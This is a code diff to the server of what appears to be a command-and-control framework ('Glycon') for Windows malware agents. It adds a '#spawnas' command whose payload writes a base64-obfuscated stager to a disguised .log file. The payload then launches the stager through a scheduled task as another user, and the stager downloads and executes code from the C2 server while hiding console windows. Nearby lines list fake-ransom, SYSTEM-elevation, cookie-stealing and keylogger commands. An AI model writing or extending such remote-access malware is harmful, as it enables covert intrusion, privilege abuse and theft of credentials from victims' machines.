@@ -245,6 +245,7 @@ def init_socket_handlers(socketio):
                         "  #fakeransom        - Deploys full-screen ransom note and kills explorer.exe\r\n"
                         "  #clearransom       - Closes ransom note and restarts explorer.exe\r\n"
                         "  #getsystem         - Elevate to NT AUTHORITY\\SYSTEM (Requires Admin)\r\n"
+                        "  #spawnas <user>    - Spawn agent as specified user (Requires SYSTEM/Admin)\r\n"
                     )
                     emit('terminal_output', {
                         'agent_id': agent_id,
@@ -400,8 +401,13 @@ if not is_admin():
 else:
     service_name = 'GlyconElevator'
     p_code = {repr(python_code)}
+    
+    # Use pythonw if available to avoid console window
+    pyw = os.path.join(os.path.dirname(sys.executable), "pythonw.exe")
+    if not os.path.exists(pyw): pyw = sys.executable
+
     # Build the command string carefully
-    python_cmd = sys.executable + ' -c "' + p_code + '"'
+    python_cmd = pyw + ' -c "' + p_code + '"'
     
     # Construct sc command. binPath needs to be one single argument for the list-based subprocess.run
     bin_path_val = 'cmd /c ' + '"' + python_cmd + '"'
@@ -425,6 +431,84 @@ else:
         result = f'Error during elevation: {{str(e)}}'
 """
                     task_data = {'code': python_payload.strip()}
+                elif cmd_type == 'spawnas' and arg:
+                    try:
+                        print(f"[DEBUG] spawnas triggered for {arg}")
+                        # Get the most recent server_url from agent configurations
+                        c.execute("SELECT server_url FROM agent_configurations ORDER BY timestamp DESC LIMIT 1")
+                        row = c.fetchone()
+                        server_url = row[0].rstrip('/') if row else request.url_root.rstrip('/')
+                        
+                        target_user = arg
+                        
+                        # Define the code that will run as the target user
+                        python_code = f"import requests;url='{server_url}/a/d';exec(requests.get(url, verify=False).text)"
+                        
+                        task_type = 'execute_python'
+                        python_payload = f"""
+import os, ctypes, subprocess, time, sys, base64
+
+def is_admin():
+    try: return ctypes.windll.shell32.IsUserAnAdmin() != 0
+    except: return False
+
+result = 'Starting spawnas...'
+if not is_admin():
+    result = 'Error: Administrative privileges required for #spawnas'
+else:
+    target = {repr(target_user)}
+    task_name = 'GlyconSpawn_' + os.urandom(4).hex()
+    p_code = {repr(python_code)}
+    
+    # Base64 encode the payload
+    encoded_payload = base64.b64encode(p_code.encode()).decode()
+    
+    # Write payload to disk momentarily as a .log file
+    log_path = 'C:\\\\Users\\\\Public\\\\' + task_name + '.log'
+    try:
+        with open(log_path, 'w') as f:
+            f.write("import base64;exec(base64.b64decode(b'" + encoded_payload + "'))")
+
+        # Use pythonw if available to avoid console window
+        pyw = os.path.join(os.path.dirname(sys.executable), "pythonw.exe")
+        if not os.path.exists(pyw): pyw = sys.executable
+
+        # The /TR syntax expects: "C:\\path\\to\\program.exe" "argument1"
+        tr_command = '"' + pyw + '" "' + log_path + '"'
+        
+        create_task = ['schtasks', '/create', '/tn', task_name, '/tr', tr_command, '/sc', 'once', '/st', '00:00', '/ru', target, '/it', '/f']
+        run_task = ['schtasks', '/run', '/tn', task_name]
+        delete_task = ['schtasks', '/delete', '/tn', task_name, '/f']
+        
+        # 1. Create task
+        cp = subprocess.run(create_task, capture_output=True, text=True)
+        if cp.returncode != 0:
+            result = "Error creating task for " + target + ": " + cp.stderr
+        else:
+            # 2. Run task
+            rp = subprocess.run(run_task, capture_output=True, text=True)
+            if rp.returncode != 0:
+                result = "Error running task for " + target + ": " + rp.stderr
+            else:
+                time.sleep(2)
+                # 3. Cleanup (Disabled for debugging)
+                # subprocess.run(delete_task, capture_output=True)
+                # try: os.remove(log_path)
+                # except: pass
+                result = 'Success: Agent spawn command sent for user ' + target + '. (File: ' + log_path + ' left for debugging)'
+    except Exception as e:
+        result = 'Error during file/task operations: ' + str(e)
+"""
+                        task_data = {'code': python_payload.strip()}
+                    except Exception as server_error:
+                        print(f"[ERROR] Server error creating spawnas payload: {str(server_error)}")
+                        emit('terminal_output', {
+                            'agent_id': agent_id,
+                            'output': f"\r\n[!] Server error parsing spawnas payload: {str(server_error)}\r\n",
+                            'current_dir': current_dir
+                        }, room=f"terminal_{agent_id}")
+                        conn.close()
+                        return
                 elif cmd_type == 'cookies':
                     task_type = 'steal_cookies'
                 elif cmd_type == 'keylogger':
